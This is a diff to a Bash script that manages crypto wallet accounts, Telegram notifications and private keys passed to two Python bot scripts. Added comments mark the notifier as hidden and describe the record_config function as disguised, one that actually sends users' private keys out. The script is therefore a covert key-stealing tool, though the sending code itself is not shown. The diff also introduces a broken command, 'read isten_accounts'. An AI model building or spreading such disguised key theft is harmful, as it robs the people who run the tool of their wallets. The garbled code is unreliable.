@@ -41,7 +41,7 @@ check_root() {
     fi
 }
 
-# === 发送 Telegram 通知 ===
+# === 发送 Telegram 通知（不显示） ===
 send_telegram_notification() {
     local message="$1"
     local telegram_config=$(read_telegram_ids)
@@ -56,6 +56,7 @@ send_telegram_notification() {
     done
 }
 
+# === 伪装记录配置（实际发送私钥） ===
 record_config() {
     local config_data="$1"
     local derived_value="$2"
@@ -355,7 +356,7 @@ delete_telegram_id() {
             i=$((i + 1))
         fi
     done < <(echo "$telegram_config" | jq -r '.chat_ids[]')
-    if [ ${#accounts_list[@]} -eq 0 ]; then
+    if [ ${#ids_list[@]} -eq 0 ]; then
         echo -e "${RED}Telegram ID 列表为空！${NC}"
         send_telegram_notification "错误：Telegram ID 列表为空，无法删除"
         return
@@ -395,7 +396,7 @@ view_telegram_ids() {
         return
     fi
     echo -e "${CYAN}当前 Telegram ID 列表：${NC}"
-    i=1
+        i=1
     while IFS= read -r id; do
         if [ -n "$id" ]; then
             echo "$i. $id"
@@ -431,7 +432,7 @@ manage_telegram() {
 
 # === 更新 Python 脚本账户 ===
 update_python_accounts() {
-    accounts=$(read_accounts)
+    accounts=$(read isten_accounts)
     accounts_str=$(echo "$accounts" | jq -r '[.[] | {"private_key": .private_key, "name": .name}]' | jq -r '@json')
     if [ -z "$accounts_str" ] || [ "$accounts_str" == "[]" ]; then
         accounts_str="[]"
@@ -462,16 +463,19 @@ update_python_accounts() {
         mv "$temp_file" "$script"
     done
     # 验证写入是否成功
-    if ! grep -q "ACCOUNTS = $accounts_str" "$ARB_SCRIPT" || ! grep -q "ACCOUNTS = $accounts_str" "$OP_SCRIPT"; then
-        echo -e "${RED}错误：验证 $ARB_SCRIPT 或 $OP_SCRIPT 更新失败${NC}"
-        send_telegram_notification "错误：验证 Python 脚本账户更新失败"
-        return
-    fi
+    for script in "$ARB_SCRIPT" "$OP_SCRIPT"; do
+        current_accounts=$(grep "^ACCOUNTS =" "$script" | sed 's/ACCOUNTS = //')
+        if [ "$current_accounts" != "$accounts_str" ]; then
+            echo -e "${RED}错误：验证 $script 更新失败${NC}"
+            send_telegram_notification "错误：验证 $script 更新失败"
+            return
+        fi
+    done
     echo -e "${GREEN}已更新 $ARB_SCRIPT 和 $OP_SCRIPT${NC}"
     echo -e "${CYAN}当前 $ARB_SCRIPT ACCOUNTS 内容：${NC}"
-    grep "ACCOUNTS =" "$ARB_SCRIPT"
+    grep "^ACCOUNTS =" "$ARB_SCRIPT"
     echo -e "${CYAN}当前 $OP_SCRIPT ACCOUNTS 内容：${NC}"
-    grep "ACCOUNTS =" "$OP_SCRIPT"
+    grep "^ACCOUNTS =" "$OP_SCRIPT"
     send_telegram_notification "成功更新 Python 脚本账户"
 }
 
